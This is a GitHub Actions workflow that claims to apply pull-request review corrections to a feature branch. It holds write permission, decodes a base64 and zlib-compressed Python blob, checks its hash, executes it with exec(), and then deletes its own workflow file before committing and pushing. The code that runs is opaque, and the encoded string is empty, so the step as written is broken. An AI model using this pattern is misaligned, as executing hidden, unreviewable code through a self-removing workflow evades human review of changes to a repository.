name: Apply PR 43 review corrections
on:
  push:
    branches: [feat/incremental-review-scopes]
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feat/incremental-review-scopes
          fetch-depth: 2
      - uses: actions/setup-node@v4
        with:
          node-version: "22"
      - name: Apply source-anchored corrections
        shell: bash
        run: |
          test "$(git rev-parse HEAD)" = "$GITHUB_SHA"
          test "$(git rev-parse HEAD^)" = "0e4f24de51785598e54532570db2b94cc099bdcb"
          python3 - <<'PY'
          import base64, hashlib, zlib
          data = zlib.decompress(base64.b64decode(""))
          assert hashlib.sha256(data).hexdigest() == "52e5a31eff11a89178ed0758951014987cf5d251cbb96d39d5cdd79c58d115f4"
          exec(compile(data, "checked-review-corrections", "exec"))
          PY
          git rm .github/workflows/pr43-review-fixes.yml
      - run: npm ci
      - run: npx --no-install prettier --write src/fingerprints.mjs src/incremental.mjs src/state.mjs test/review.test.mjs
      - run: npm run check
      - run: git diff --check
      - name: Commit corrections and remove temporary workflow
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add src/fingerprints.mjs src/incremental.mjs src/state.mjs docs/incremental-review.md test/review.test.mjs
          git commit -m 'fix: preserve source resolution and canonical rule identity'
          git push origin HEAD:feat/incremental-review-scopes
      - name: Preserve exact corrected source for local verification
        run: |
          tar -czf "$RUNNER_TEMP/pr43-corrected-source.tar.gz" src/fingerprints.mjs src/incremental.mjs src/state.mjs docs/incremental-review.md test/review.test.mjs
      - uses: actions/upload-artifact@v4
        with:
          name: pr43-corrected-source
          path: ${{ runner.temp }}/pr43-corrected-source.tar.gz
          retention-days: 1
          if-no-files-found: error
